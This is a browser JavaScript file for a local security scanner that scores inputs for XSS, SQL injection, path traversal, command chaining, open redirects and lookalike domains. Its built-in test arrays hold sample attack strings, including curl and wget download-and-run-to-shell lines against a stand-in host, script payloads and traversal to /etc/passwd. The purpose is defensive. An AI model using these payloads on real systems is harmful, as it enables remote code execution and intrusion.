// app.js
(() => {
  "use strict";

  const BUILD = "v2026-01-05_normlayer_freeze";
  const nowISO = () => new Date().toISOString();

  function $(id) { return document.getElementById(id); }

  function safeOn(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn, { passive: true });
  }

  // ---------- Utils ----------
  function shannonEntropy(str) {
    if (!str) return 0;
    const freq = new Map();
    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
    const len = str.length;
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / len;
      ent -= p * Math.log2(p);
    }
    return Math.round(ent * 100) / 100;
  }

  function looksLikeURL(s) {
    return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
  }

  // ---------- Normalization Layer (strict & bounded) ----------
  const MAX_NORM_LEN = 4096; // hard cap to avoid pathological cases

  function clampLen(s) {
    if (!s) return "";
    return s.length > MAX_NORM_LEN ? s.slice(0, MAX_NORM_LEN) : s;
  }

  function normalizeNFKC(s) {
    try { return s.normalize("NFKC"); } catch { return s; }
  }

  function normalizeSlashes(s) {
    // defensive: unify backslashes
    return s.replace(/\\/g, "/");
  }

  function decodePercentU(s) {
    // %uXXXX
    return s.replace(/%u([0-9a-fA-F]{4})/g, (_, h) => {
      try { return String.fromCharCode(parseInt(h, 16)); } catch { return _; }
    });
  }

  function decodePercentBytesManual(s) {
    return s.replace(/%([0-9a-fA-F]{2})/g, (_, h) => {
      try { return String.fromCharCode(parseInt(h, 16)); } catch { return _; }
    });
  }

  function safePercentDecodeOnce(s) {
    const pre = decodePercentU(s);
    // Try decodeURIComponent if it looks safe, else manual fallback
    try {
      // decodeURIComponent throws on malformed sequences, so fallback to manual if needed
      return decodeURIComponent(pre);
    } catch {
      return decodePercentBytesManual(pre);
    }
  }

  function percentDecodeBounded(s, steps) {
    let cur = s;
    for (let i = 1; i <= 2; i++) {
      const next = safePercentDecodeOnce(cur);
      if (next !== cur) steps.push(`PCT_DECODE#${i}`);
      cur = next;
      if (cur === next && i === 1) break;
      if (cur === next) break;
    }
    return cur;
  }

  const HTML_ENTITY_MAP = {
    "&lt;": "<", "&gt;": ">", "&amp;": "&", "&quot;": "\"", "&#34;": "\"", "&#39;": "'",
    "&apos;": "'", "&nbsp;": " "
  };

  function decodeHtmlEntitiesOnce(s, steps) {
    let out = s;

    // Named/common
    for (const [k, v] of Object.entries(HTML_ENTITY_MAP)) {
      if (out.includes(k)) out = out.split(k).join(v);
    }

    // Numeric: &#NN; and &#xNN;
    out = out.replace(/&#x([0-9a-fA-F]+);/g, (_, hx) => {
      try { return String.fromCharCode(parseInt(hx, 16)); } catch { return _; }
    });
    out = out.replace(/&#([0-9]+);/g, (_, nn) => {
      try { return String.fromCharCode(parseInt(nn, 10)); } catch { return _; }
    });

    if (out !== s) steps.push("HTML_ENTITY");
    return out;
  }

  function decodeJsEscapesOnce(s, steps) {
    let out = s;
    out = out.replace(/\\x([0-9a-fA-F]{2})/g, (_, h) => {
      try { return String.fromCharCode(parseInt(h, 16)); } catch { return _; }
    });
    out = out.replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => {
      try { return String.fromCharCode(parseInt(h, 16)); } catch { return _; }
    });
    if (out !== s) steps.push("JS_ESCAPE");
    return out;
  }

  function tryBase64DecodeDataUri(s, steps) {
    const m = /^data:text\/html;base64,([a-z0-9+\/=\s]+)$/i.exec(s.trim());
    if (!m) return s;

    try {
      const b64 = m[1].replace(/\s+/g, "");
      const bin = atob(b64);
      // best-effort UTF-8 decode
      const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
      const decoded = new TextDecoder("utf-8", { fatal: false }).decode(bytes);
      steps.push("BASE64_DATAURI");
      return decoded;
    } catch {
      return s;
    }
  }

  function normalizeInput(raw) {
    const steps = [];
    let s = (raw || "").trim();

    const n1 = normalizeNFKC(s);
    if (n1 !== s) steps.push("NFKC");
    s = n1;

    const n2 = normalizeSlashes(s);
    if (n2 !== s) steps.push("SLASH");
    s = n2;

    // If it's a data:text/html;base64,..., decode safely (bounded)
    const preB64 = s;
    s = tryBase64DecodeDataUri(s, steps);
    if (s !== preB64) {
      // After base64 decode, run minimal normalization once (bounded)
      s = clampLen(s);
    }

    // Percent decode (max 2 passes)
    s = percentDecodeBounded(s, steps);
    s = clampLen(s);

    // HTML entities (1 pass)
    s = decodeHtmlEntitiesOnce(s, steps);
    s = clampLen(s);

    // JS escapes (1 pass)
    s = decodeJsEscapesOnce(s, steps);
    s = clampLen(s);

    return { norm: s, steps };
  }

  // ---------- Type classification (use normalized view) ----------
  function classifyType(raw, norm) {
    const x = (norm || raw || "").trim();
    if (!x) return "Data";

    const isURLish = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);

    const isExploit =
      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\/windows\/system32\/|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(x);

    if (isExploit) return "Exploit";
    if (isURLish) return "URL";
    return "Data";
  }

  // ---------- Domain lookalike (basic skeleton, no network) ----------
  function safeParseURL(u) {
    try {
      if (/^https?:\/\//i.test(u)) return new URL(u);
      // allow schemeless domains
      if (/^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(u)) return new URL("https://" + u);
      return null;
    } catch { return null; }
  }

  function extractHostCandidates(text) {
    const s = text || "";
    const hosts = new Set();

    // full URLs
    const urlRe = /\bhttps?:\/\/[^\s"'<>]+/ig;
    for (const m of s.matchAll(urlRe)) {
      const u = safeParseURL(m[0]);
      if (u?.hostname) hosts.add(u.hostname);
    }

    // scheme-less //host
    const schemeless = /(^|[=\s])\/\/([a-z0-9.-]+\.[a-z]{2,})(?=\/|$)/ig;
    for (const m of s.matchAll(schemeless)) {
      hosts.add(m[2]);
    }

    // bare domains
    const bare = /\b([a-z0-9.-]+\.[a-z]{2,})\b/ig;
    for (const m of s.matchAll(bare)) {
      hosts.add(m[1]);
    }

    return [...hosts];
  }

  function skeletonHost(host) {
    const map = new Map([
      ["0", "o"], ["1", "l"], ["3", "e"], ["5", "s"], ["7", "t"],
      ["I", "l"], ["|", "l"], ["O", "o"]
    ]);
    let out = "";
    for (const ch of host) out += (map.get(ch) ?? ch);
    return out.toLowerCase();
  }

  function lookalikeHit(raw, norm) {
    const candidates = new Set([
      ...extractHostCandidates(raw || ""),
      ...extractHostCandidates(norm || "")
    ]);

    for (const host of candidates) {
      if (!host) continue;
      if (/^xn--/i.test(host)) continue; // already covered by HOMOGRAPH_RISK
      const sk = skeletonHost(host);
      if (sk !== host.toLowerCase()) {
        return {
          label: "LOOKALIKE_BASIC",
          sev: 65,
          conf: 75
        };
      }
    }
    return null;
  }

  // ---------- Signal rules ----------
  const RULES = [
    {
      label: "REDIRECT_PARAM",
      test: s => /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i.test(s) || /\b(returnUrl|next)=\/\/[^ \n]+/i.test(s),
      sev: 55, conf: 90
    },
    {
      label: "AUTH_ENDPOINT",
      test: s => /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(s),
      sev: 45, conf: 80
    },
    {
      label: "BASE64_DECODE",
      test: s => /(data:text\/html;base64,|eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,})/i.test(s),
      sev: 35, conf: 70
    },
    {
      label: "OBFUSCATION",
      test: s => /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|[A-Za-z0-9+\/]{30,}={0,2}/i.test(s),
      sev: 35, conf: 67
    },
    {
      label: "HOMOGRAPH_RISK",
      test: s => /\bxn--/i.test(s),
      sev: 60, conf: 70
    },
    {
      label: "XSS/JS_SCRIPT",
      test: s => /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(s),
      sev: 85, conf: 85
    },
    {
      label: "LFI:ETC_PASSWD",
      test: s => /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\/system32\/drivers\/etc\/hosts/i.test(s),
      sev: 80, conf: 75
    },
    {
      label: "CMD:CMD_CHAIN",
      test: s => {
        // avoid raw false positives inside base64 data-uri; decoded content is handled via normalization
        if (/^data:text\/html;base64,/i.test((s || "").trim())) return false;
        return /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i.test(s);
      },
      sev: 85, conf: 85
    },
    {
      label: "DOWNLOAD_TOOL",
      test: s => /\b(wget|curl)\b.*\b(http|https):\/\/.*(\|\s*(sh|bash)|-O-|\|\s*sh)/i.test(s),
      sev: 90, conf: 90
    },
    {
      label: "SQL:SQLI_TAUTOLOGY",
      test: s => /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i.test(s),
      sev: 75, conf: 85
    },
    {
      label: "SQL:SQLI_UNION_ALL",
      test: s => /union\s+select/i.test(s),
      sev: 80, conf: 80
    }
  ];

  function scanWithRules(s) {
    const hits = [];
    const x = (s || "").trim();
    for (const r of RULES) {
      if (r.test(x)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
    }
    return hits;
  }

  function analyzeOne(input) {
    const raw = (input || "").trim();
    const { norm, steps: normSteps } = normalizeInput(raw);

    const hitsRaw = scanWithRules(raw).map(h => ({ ...h, src: "raw" }));
    const hitsNorm = (norm !== raw ? scanWithRules(norm) : []).map(h => ({ ...h, src: "norm" }));

    // Add basic lookalike detection (no network)
    const lk = lookalikeHit(raw, norm);
    const hitsLook = lk ? [{ ...lk, src: "norm" }] : [];

    // Union by label (keep max sev/conf, keep src list)
    const hitMap = new Map();
    for (const h of [...hitsRaw, ...hitsNorm, ...hitsLook]) {
      const prev = hitMap.get(h.label);
      if (!prev) {
        hitMap.set(h.label, { label: h.label, sev: h.sev, conf: h.conf, src: new Set([h.src]) });
      } else {
        prev.sev = Math.max(prev.sev, h.sev);
        prev.conf = Math.max(prev.conf, h.conf);
        prev.src.add(h.src);
      }
    }
    const hits = [...hitMap.values()].map(h => ({
      label: h.label,
      sev: h.sev,
      conf: h.conf,
      src: [...h.src]
    }));

    let severity = 0, confidence = 0;
    if (hits.length) {
      severity = Math.max(...hits.map(h => h.sev));
      confidence = Math.max(...hits.map(h => h.conf));
    }

    let decision = "ALLOW";
    if (hits.some(h => h.sev >= 85) || hits.some(h => h.label === "DOWNLOAD_TOOL")) decision = "BLOCK";
    else if (hits.some(h => h.sev >= 55)) decision = "WARN";

    const type = classifyType(raw, norm);
    const entropy = shannonEntropy(raw);

    return {
      input: raw,
      raw,
      norm,
      normSteps,
      type,
      decision,
      severity,
      confidence,
      entropy,
      hits,
      hitsRaw,
      hitsNorm
    };
  }

  function verdictFrom(rows) {
    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
    for (const r of rows) {
      if (r.decision === "ALLOW") counts.allow++;
      else if (r.decision === "WARN") counts.warn++;
      else counts.block++;
    }

    const peakSeverity = rows.length ? Math.max(...rows.map(r => r.severity)) : 0;
    const confidence = rows.length ? Math.max(...rows.map(r => r.confidence)) : 0;

    let verdict = "SECURE";
    if (counts.block > 0) verdict = "DANGER";
    else if (counts.warn > 0) verdict = "SUSPICIOUS";

    const sigMap = new Map();
    for (const r of rows) {
      for (const h of (r.hits || [])) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
    }
    const signals = [...sigMap.entries()]
      .sort((a, b) => b[1] - a[1])
      .map(([label, count]) => ({ label, count }));

    return { verdict, peakSeverity, confidence, counts, signals };
  }

  function buildReport(rows) {
    const meta = verdictFrom(rows);
    return {
      generatedAt: nowISO(),
      verdict: meta.verdict,
      peakSeverity: meta.peakSeverity,
      confidence: meta.confidence,
      counts: meta.counts,
      signals: meta.signals,
      rows
    };
  }

  function setVerdictUI(meta) {
    const verdictText = $("verdictText");
    const box = $("verdictBox");
    if (!verdictText || !box) return;

    verdictText.textContent = meta.verdict;

    box.style.borderColor =
      meta.verdict === "DANGER" ? "rgba(239,68,68,.35)" :
      meta.verdict === "SUSPICIOUS" ? "rgba(245,158,11,.35)" :
      "rgba(45,212,191,.25)";

    $("peakSev").textContent = `Peak severity: ${meta.peakSeverity}%`;
    $("peakConf").textContent = `Confidence: ${meta.confidence}%`;

    $("kScans").textContent = String(meta.counts.scans);
    $("kAllow").textContent = String(meta.counts.allow);
    $("kWarn").textContent = String(meta.counts.warn);
    $("kBlock").textContent = String(meta.counts.block);

    const reco = $("reco");
    if (reco) {
      if (meta.verdict === "DANGER") {
        reco.textContent = "Remediation: Block these inputs in the pipeline. Do NOT open. Verify domain ownership. Escalate with JSON report.";
      } else if (meta.verdict === "SUSPICIOUS") {
        reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
      } else {
        reco.textContent = "No high-severity patterns detected.";
      }
    }

    const sigWrap = $("signals");
    if (sigWrap) {
      sigWrap.innerHTML = "";
      for (const s of meta.signals) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = `${s.label} ×${s.count}`;
        sigWrap.appendChild(d);
      }
      if (!meta.signals.length) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = "No active signals";
        sigWrap.appendChild(d);
      }
    }
  }

  function renderRows(rows) {
    const host = $("rows");
    if (!host) return;
    host.innerHTML = "";

    for (const r of rows) {
      const tr = document.createElement("div");
      tr.className = "trow";

      const dotClass = r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad");

      const c1 = document.createElement("div");
      c1.className = "mono";
      c1.textContent = r.input.length > 120 ? r.input.slice(0, 120) + "…" : r.input;

      const c2 = document.createElement("div");
      c2.textContent = r.type;

      const c3 = document.createElement("div");
      c3.className = "tag";
      const dot = document.createElement("span");
      dot.className = `dot ${dotClass}`;
      const t = document.createElement("span");
      t.textContent = r.decision;
      c3.append(dot, t);

      const c4 = document.createElement("div");
      c4.textContent = `${r.severity}%`;

      const c5 = document.createElement("div");
      c5.textContent = `${r.confidence}%`;

      const c6 = document.createElement("div");
      c6.textContent = String(r.entropy);

      tr.append(c1, c2, c3, c4, c5, c6);
      host.appendChild(tr);
    }
  }

  function parseInputLines(txt) {
    return (txt || "")
      .split(/\r?\n/)
      .map(s => s.trim())
      .filter(Boolean);
  }

  // Tests (as before)
  const TEST_A = [
    "hello world",
    "https://example.com/",
    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evil.com",
    "https://login.microsoftonline.com/common/oauth2/authorize?redirect_uri=https://evl1.com",
    "http://xn--pple-43d.com/login",
    "http://paypaI.com/security",
    "http://micros0ft.com/account/verify",
    "https://good.com/redirect?url=https://evil.com",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "redirect_uri=https://evil.com",
    "returnUrl=//evil.com",
    "next=//evil.com",
    "url=javascript:alert(1)",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; ls -la",
    "| whoami",
    "&& curl http://evl1.tld/payload.sh | sh",
    "powershell -enc SQBFAFgA",
    "SELECT * FROM users WHERE 1=1 OR 1=1",
    "' OR '1'='1",
    "admin'--",
    "UNION SELECT username,password FROM users",
    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload\"}",
    "Authorization: Bearer abc.def.ghi",
    "AKIAIOSFODNN7EXAMPLE",
    "-----BEGIN PRIVATE KEY-----",
    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
    "-----END PRIVATE KEY-----",
    "{\"op\":\"add\",\"path\":\"/admin\",\"value\":true}",
    "wget http://evl1.tld/a.sh -O- | sh",
    "curl -s http://evl1.tld/a | bash",
    "<script src=https://static.cloudflareinsights.com/beacon.min.js></script>"
  ];

  const TEST_B = [
    "hello world",
    "https://example.com/",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "returnUrl=//evil.com",
    "url=javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "&& curl http://evl1.tld/payload.sh | sh",
    "UNION SELECT username,password FROM users",
    "powershell -enc SQBFAFgA",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "http://paypaI.com/security",
    "http://micros0ft.com/account/verify"
  ];

  let lastReport = null;

  function runScanFromTextarea() {
    const inputEl = $("input");
    if (!inputEl) return;

    const lines = parseInputLines(inputEl.value);
    const rows = lines.map(analyzeOne);
    const report = buildReport(rows);

    lastReport = report;

    setVerdictUI({
      verdict: report.verdict,
      peakSeverity: report.peakSeverity,
      confidence: report.confidence,
      counts: report.counts,
      signals: report.signals
    });

    renderRows(report.rows);
  }

  function exportJSON() {
    if (!lastReport) runScanFromTextarea();
    if (!lastReport) return;

    const blob = new Blob([JSON.stringify(lastReport, null, 2)], { type: "application/json" });
    const a = document.createElement("a");
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    a.download = `validoon_report_${ts}.json`;
    a.href = URL.createObjectURL(blob);
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      URL.revokeObjectURL(a.href);
      a.remove();
    }, 0);
  }

  function clearAll() {
    const inputEl = $("input");
    if (inputEl) inputEl.value = "";
    lastReport = null;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    renderRows([]);
  }

  function loadTest(lines) {
    const inputEl = $("input");
    if (!inputEl) return;
    inputEl.value = lines.join("\n");
    runScanFromTextarea();
  }

  function openInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.showModal === "function") dlg.showModal();
  }

  function closeInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.close === "function") dlg.close();
  }

  function boot() {
    const stamp = $("buildStamp");
    if (stamp) stamp.textContent = `Build: ${BUILD}`;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    safeOn($("btnLoadA"), "click", () => loadTest(TEST_A));
    safeOn($("btnLoadB"), "click", () => loadTest(TEST_B));
    safeOn($("btnScan"), "click", runScanFromTextarea);
    safeOn($("btnExport"), "click", exportJSON);
    safeOn($("btnClear"), "click", clearAll);
    safeOn($("btnInfo"), "click", openInfo);
    safeOn($("btnCloseInfo"), "click", closeInfo);

    console.log(`[Validoon] ${BUILD} loaded. Local-only. No network.`);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
